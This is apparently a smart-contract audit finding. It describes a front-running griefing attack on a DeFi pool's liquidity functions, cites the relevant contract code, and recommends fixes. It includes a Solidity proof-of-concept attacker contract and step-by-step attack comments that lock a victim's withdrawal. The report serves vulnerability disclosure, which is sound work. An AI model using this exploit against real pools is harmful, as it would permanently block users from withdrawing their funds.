Audit Report

## Title
Third-party `addLiquidity` on behalf of victim creates dust remainder that permanently blocks `removeLiquidity` — (`metric-core/contracts/libraries/LiquidityLib.sol`)

## Summary

`MetricOmmPool.addLiquidity` accepts an arbitrary `owner` address independent of `msg.sender`, allowing any caller to credit shares to a victim's position. `LiquidityLib.removeLiquidity` enforces that any non-zero post-burn remainder must be at or above `minimalMintableLiquidity`. An attacker can front-run a victim's full-withdrawal transaction by adding exactly 1 share to the victim's position, causing the victim's transaction to leave a 1-share remainder below the dust floor, reverting indefinitely. The victim's principal is permanently locked as long as the attacker repeats the front-run.

## Finding Description

`MetricOmmPool.addLiquidity` takes an `owner` parameter with no restriction requiring `msg.sender == owner`: [1](#0-0) 

The callback is invoked on `msg.sender` (attacker pays tokens), but shares are credited to the victim's `(owner, salt, binIdx)` position key: [2](#0-1) 

The add-side dust check only reverts if `newUserShares = userShares + sharesToAdd < minimalMintableLiquidity`. If the victim already holds `X >= minimalMintableLiquidity` shares, adding 1 yields `X+1`, which passes: [3](#0-2) 

`removeLiquidity` enforces `msg.sender == owner`, so only the victim can call it: [4](#0-3) 

`removeLiquidity` then enforces that any non-zero remainder is at or above the dust floor: [5](#0-4) 

Attack sequence:
1. Victim holds `X` shares in bin `B` and submits `removeLiquidity(victim, salt, {X shares}, "")`.
2. Attacker front-runs with `addLiquidity(victim, salt, {1 share in bin B}, callbackData, "")`. Victim now holds `X+1` shares.
3. Victim's transaction executes: `newUserShares = (X+1) - X = 1`. The check `1 > 0 && 1 < minimalMintableLiquidity` is true → reverts with `MinimalLiquidity(1, 1000)`.
4. Attacker repeats on every retry.

The position key is fully observable from on-chain `LiquidityAdded` events (indexed by `owner` and `salt`): [6](#0-5) 

The periphery explicitly supports and tests adding on behalf of another owner: [7](#0-6) 

The `_beforeAddLiquidity` extension hook could theoretically block this if a `DEPOSIT_ALLOWLIST_PROVIDER` extension is configured, but this is an optional per-pool configuration — pools without it are fully vulnerable with no protocol-level guard. [8](#0-7) 

## Impact Explanation

An EOA victim cannot withdraw their liquidity as long as the attacker front-runs each attempt. The victim's principal is locked in the pool indefinitely. This directly satisfies "Broken core pool functionality causing loss of funds or unusable withdraw/swap/liquidity flows." Severity is High: victim's full principal is inaccessible, the attacker's per-front-run cost is the token value of 1 share (economically negligible), and no protocol-provided escape hatch exists for EOA victims.

## Likelihood Explanation

The attack requires MEV front-running capability (available on most EVM chains) and knowledge of the victim's `(owner, salt, binIdx)` tuple, which is fully public from on-chain `LiquidityAdded` events. The per-attack token cost is minimal (1 share). Any pool without a `DEPOSIT_ALLOWLIST_PROVIDER` extension is vulnerable. The periphery's `addLiquidityExactShares` overload explicitly supports the third-party-add pattern, confirming it is an intended and accessible code path.

## Recommendation

1. **Restrict third-party adds**: In `addLiquidity`, require `msg.sender == owner` unless the owner has explicitly granted operator approval via an on-chain allowance mapping or signed permit.
2. **Alternatively**, add a `removeAllLiquidity` variant that burns the caller's entire share balance in a bin atomically without applying the dust-floor check on the remainder (since the remainder is exactly 0).
3. **Alternatively**, remove the `MinimalLiquidity` check from `removeLiquidity` entirely (apply it only on `addLiquidity`), so users can always exit to zero regardless of intermediate share counts.

## Proof of Concept

```solidity
contract Attacker is IMetricOmmModifyLiquidityCallback {
    address token0; address token1;
    constructor(address t0, address t1) { token0 = t0; token1 = t1; }

    function grief(address pool, address victim, uint80 salt, int256 bin) external {
        int256[] memory bins = new int256[](1);
        bins[0] = bin;
        uint256[] memory shares = new uint256[](1);
        shares[0] = 1; // passes add-side check because victim already has >= minimalMintableLiquidity
        LiquidityDelta memory d = LiquidityDelta({binIdxs: bins, shares: shares});
        IMetricOmmPool(pool).addLiquidity(victim, salt, d, "", "");
    }

    function metricOmmModifyLiquidityCallback(uint256 a0, uint256 a1, bytes calldata) external {
        if (a0 > 0) IERC20(token0).transfer(msg.sender, a0);
        if (a1 > 0) IERC20(token1).transfer(msg.sender, a1);
    }
}
// 1. victim has 10_000 shares in bin 4 (>= minimalMintableLiquidity = 1000)
// 2. victim submits removeLiquidity(victim, salt, {10_000 shares}, "")
// 3. attacker.grief(pool, victim, salt, 4)  ← front-runs; victim now has 10_001 shares
// 4. victim's tx: newUserShares = 10_001 - 10_000 = 1 < 1000 → MinimalLiquidity revert
// 5. repeat indefinitely; victim's principal is permanently locked
```

### Citations

**File:** metric-core/contracts/MetricOmmPool.sol (L182-196)
```text
  function addLiquidity(
    address owner,
    uint80 salt,
    LiquidityDelta calldata deltas,
    bytes calldata callbackData,
    bytes calldata extensionData
  ) external nonReentrant(PoolActions.ADD_LIQUIDITY) returns (uint256 amount0Added, uint256 amount1Added) {
    if (deltas.binIdxs.length == 0) return (0, 0);
    if (deltas.binIdxs.length != deltas.shares.length) revert LiquidityDeltaLengthMismatch();
    _beforeAddLiquidity(msg.sender, owner, salt, deltas, extensionData);
    (amount0Added, amount1Added) = LiquidityLib.addLiquidity(
      _liquidityContext(), owner, salt, deltas, callbackData, binTotals, _binStates, _binTotalShares, _positionBinShares
    );
    _afterAddLiquidity(msg.sender, owner, salt, deltas, amount0Added, amount1Added, extensionData);
  }
```

**File:** metric-core/contracts/MetricOmmPool.sol (L206-206)
```text
    if (msg.sender != owner) revert NotPositionOwner();
```

**File:** metric-core/contracts/libraries/LiquidityLib.sol (L76-79)
```text
          uint256 newUserShares = userShares + sharesToAdd;
          if (newUserShares < ctx.minimalMintableLiquidity) {
            revert IMetricOmmPoolActions.MinimalLiquidity(newUserShares, ctx.minimalMintableLiquidity);
          }
```

**File:** metric-core/contracts/libraries/LiquidityLib.sol (L147-148)
```text
        IMetricOmmModifyLiquidityCallback(msg.sender)
          .metricOmmModifyLiquidityCallback(amount0Added, amount1Added, callbackData);
```

**File:** metric-core/contracts/libraries/LiquidityLib.sol (L199-202)
```text
          uint256 newUserShares = userShares - sharesToRemove;
          if (newUserShares > 0 && newUserShares < ctx.minimalMintableLiquidity) {
            revert IMetricOmmPoolActions.MinimalLiquidity(newUserShares, ctx.minimalMintableLiquidity);
          }
```

**File:** metric-core/contracts/libraries/LiquidityLib.sol (L256-259)
```text
  function _positionBinKey(address owner, uint80 salt, int8 bin) internal pure returns (bytes32 key) {
    // forge-lint: disable-next-line(asm-keccak256)
    return keccak256(abi.encode(owner, salt, bin));
  }
```

**File:** metric-periphery/test/MetricOmmPoolLiquidityAdder.t.sol (L211-220)
```text
  function test_exactShares_canAddOnBehalfOfAnotherOwner() public {
    LiquidityDelta memory d = _deltaAbovePrice(4, 10_000);
    address bob = makeAddr("bob");

    vm.prank(alice);
    helper.addLiquidityExactShares(address(pool), bob, 1, d, type(uint256).max, type(uint256).max, "");

    uint256 bobShares = stateView.positionBinShares(address(pool), bob, 1, int8(4));
    assertGt(bobShares, 0);
  }
```

**File:** metric-core/contracts/ExtensionCalling.sol (L88-99)
```text
  function _beforeAddLiquidity(
    address sender,
    address owner,
    uint80 salt,
    LiquidityDelta calldata deltas,
    bytes calldata extensionData
  ) internal {
    _callExtensionsInOrder(
      BEFORE_ADD_LIQUIDITY_ORDER,
      abi.encodeCall(IMetricOmmExtensions.beforeAddLiquidity, (sender, owner, salt, deltas, extensionData))
    );
  }
```
